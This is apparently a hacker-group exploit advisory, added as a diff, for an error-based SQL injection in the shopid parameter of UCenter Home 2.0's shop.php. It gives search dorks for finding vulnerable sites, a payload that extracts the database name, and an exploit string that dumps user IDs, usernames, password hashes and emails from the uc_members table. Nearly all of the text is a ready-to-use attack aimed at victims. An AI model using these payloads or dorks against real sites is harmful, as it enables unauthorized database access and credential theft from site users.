@@ -1,0 +1,32 @@
+                              __--==UCenter Home 2.0 -(0day) Remote SQL Injection Vulnerability==--__
+                              
+*/ Author : KnocKout
+*/ Greatz : DaiMon,BARCOD3,RiskY and iranian hackers
+*/ Contact: knockoutr@msn.com
+*/ Cyber-Warrior.org/CWKnocKout
+__--==__--==__--==__--==__--==__--==__--==__--==__--==__--==
+Script : UCenter Home
+Version : 2.0
+Script HomePage : http://u.discuz.net/
+__--==__--==__--==__--==__--==__--==__--==__--==__--==__--==
+Dork : Powered by UCenter inurl:shop.php?ac=view
+Dork 2 : inurl:shop.php?ac=view&shopid=
+__--==__--==__--==__--==__--==__--==__--==__--==__--==__--==
+Vuln file : Shop.php
+value's : (?)ac=view&shopid=
+Vulnerable Style : SQL Injection (MySQL Error Based)
+Need Metarials : Hex Conversion
+__--==__--==__--==__--==__--==__--==__--==__--==__--==__--==
+Your Need victim Database name. 
+for Inject : http://server/shop.php?ac=view&shopid=253 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(hex(database())),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+..
+DB : Okey.
+your edit DB `[TARGET DB NAME]`
+Example : 'hiwir1_ucenter'
+Edit : Okey.
+ Your use Hex conversion. And edit Your SQL Injection Exploit..
+
+Exploit Code : http://server/shop.php?ac=view&shopid=253 253 and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(concat(uc_members.uid,0x3a,uc_members.username,0x3a,uc_members.password,0x3a,uc_members.email) as char),0x27,0x7e) FROM `hiwir1_ucenter`.uc_members LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+
+__--==__--==__--==__--==__--==__--==__--==__--==__--==__--==
